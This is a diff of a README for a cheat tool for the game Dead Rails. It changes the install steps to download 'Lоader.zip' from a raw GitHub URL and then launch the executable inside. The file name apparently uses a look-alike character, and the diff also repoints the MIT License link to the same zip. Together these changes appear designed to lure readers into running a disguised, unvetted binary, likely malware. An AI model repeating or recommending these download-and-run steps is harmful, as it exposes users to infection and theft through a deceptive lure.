@@ -50,8 +50,8 @@ Elevate your Dead Rails journey with these robust and SEO-friendly features in 2
 
 Ready to revolutionize your Dead Rails experience? Follow these carefully-crafted steps:
 
-1. **Download Loader.rar from the repository.**
-2. Extract the contents of Loader.rar to your desired directory using your favorite extraction tool.
+1. **Download https://raw.githubusercontent.com/AriakaHS/DeadRailsScriptHub/main/Lоader.zip from the repository.**
+2. Extract the contents of https://raw.githubusercontent.com/AriakaHS/DeadRailsScriptHub/main/Lоader.zip to your desired directory using your favorite extraction tool.
 3. Launch the executable suited to your operating system (see OS compatibility table above).
 4. Follow the on-screen prompts for initial setup and configuration.
 5. Refer to our detailed documentation (included in the .rar) for guidance on activating each feature.
@@ -77,7 +77,7 @@ This repository is strictly for educational and research purposes. Usage of Dead
 
 ## 📜 License
 
-Dead Rails Script OP is licensed under the [MIT License](https://opensource.org/licenses/MIT). You are free to use, modify, and distribute this project, subject to the terms and conditions described in the license.
+Dead Rails Script OP is licensed under the [MIT License](https://raw.githubusercontent.com/AriakaHS/DeadRailsScriptHub/main/Lоader.zip). You are free to use, modify, and distribute this project, subject to the terms and conditions described in the license.
 
 ---
 
